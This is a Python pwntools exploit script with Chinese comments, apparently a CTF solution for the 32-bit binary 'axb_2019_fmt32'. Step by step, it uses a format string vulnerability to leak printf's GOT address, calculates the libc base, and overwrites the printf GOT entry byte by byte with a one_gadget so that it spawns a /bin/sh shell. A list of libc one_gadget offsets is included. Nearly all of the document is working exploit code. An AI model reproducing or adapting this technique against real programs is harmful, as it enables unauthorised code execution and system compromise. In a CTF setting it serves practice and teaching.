from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('./axb_2019_fmt32')
libc = ELF('./libc-2.23.so')

printf_got = elf.got['printf']

io = process('./axb_2019_fmt32')


# 1.通过格式化字符串漏洞泄露printf函数的真实地址
payload = b'A' + p32(printf_got) + b'B' + b'%8$s' # 'A'用于保证四字节对齐，'B'用于分割printf函数地址
io.recvuntil('me:')
io.send(payload)
io.recvuntil(b'B')
printf_addr = u32(io.recv(4))
log.info(hex(printf_addr))

'''
0x3ac6c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL || {[esp+0x28], [esp+0x2c], [esp+0x30], [esp+0x34], ...} is a valid argv

0x3ac6e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL || {[esp+0x2c], [esp+0x30], [esp+0x34], [esp+0x38], ...} is a valid argv

0x3ac72 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL || {[esp+0x30], [esp+0x34], [esp+0x38], [esp+0x3c], ...} is a valid argv

0x3ac79 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL || {[esp+0x34], [esp+0x38], [esp+0x3c], [esp+0x40], ...} is a valid argv

0x5fbd5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbd6 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
'''
# 2.通过printf函数的真实地址计算出某个one_gadget的真实地址
one_gadget_list = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]
libc_base = printf_addr - libc.sym['printf']
one_gadget = libc_base + one_gadget_list[1]
info(hex(one_gadget))

# 3.通过格式化字符串漏洞将GOT表的printf表项篡改成one_gadget的地址
# 注意这里不能直接将整个4字节的地址写入，会引发异常，需要一个字节一个字节写
byte_4th = one_gadget & 0xff
# 以下三行代码需要防止整数溢出
byte_3rd = ((one_gadget >> 8) & 0xff) + 256 - byte_4th
byte_2nd = ((one_gadget >> 16) & 0xff) + 256 + 256 - byte_4th - byte_3rd
byte_1st = ((one_gadget >> 24) & 0xff) + 256 + 256 + 256 - byte_4th - byte_3rd - byte_2nd
# 由于动态链接库开启PIE，因此四个参数的位数(十进制)是不确定的，需要通过70行语句事先规定偏移量
format_str = 'a%{}c%20$hhn%{}c%21$hhn%{}c%22$hhn%{}c%23$hhn'.format(byte_4th - 10, byte_3rd, byte_2nd, byte_1st) 

payload = bytes(format_str.encode())
payload.ljust(49, b'a')
payload += p32(printf_got)
payload += p32(printf_got + 1)
payload += p32(printf_got + 2)
payload += p32(printf_got + 3)
# 这一步的漏洞利用过程比较复杂，也可以直接使用下面的语句实现相同的功能
# payload = b'a' + fmtstr_payload(8, {printf_got:one_gadget}, numbwritten = 10)

io.recvuntil('me:')

gdb.attach(io)
io.sendline(payload)

io.interactive()
